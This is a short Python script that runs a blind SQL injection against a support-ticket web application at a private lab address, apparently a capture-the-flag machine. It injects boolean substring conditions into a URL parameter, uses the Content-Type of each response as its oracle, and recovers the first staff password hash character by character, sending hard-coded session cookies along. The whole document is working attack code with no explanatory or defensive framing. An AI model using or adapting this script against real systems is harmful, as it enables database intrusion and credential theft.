import requests

def blindInject(query):
    url = f"http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7 {query}"
    # Change cookie
    cookies = {'PHPSESSID':'lq1cfc4t3upb5p4pqcpmftcnb1', 'usrhash':'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+F17KMZ44LDq7MJ4o4ZDbx1GAgeVnXUZaVQLevzMj3ugw=='}
    response = requests.get(url, cookies=cookies)
    rContentType = response.headers["Content-Type"]
    if rContentType == 'image/png':
        return True
    else:
        return False

keyspace = 'abcdef0123456789'
for i in range(0,41):
    for c in keyspace:
        inject = f"and substr((select password from staff limit 0,1),{i},1) = '{c}'"
        if blindInject(inject):
            print(c, end='', flush=True)
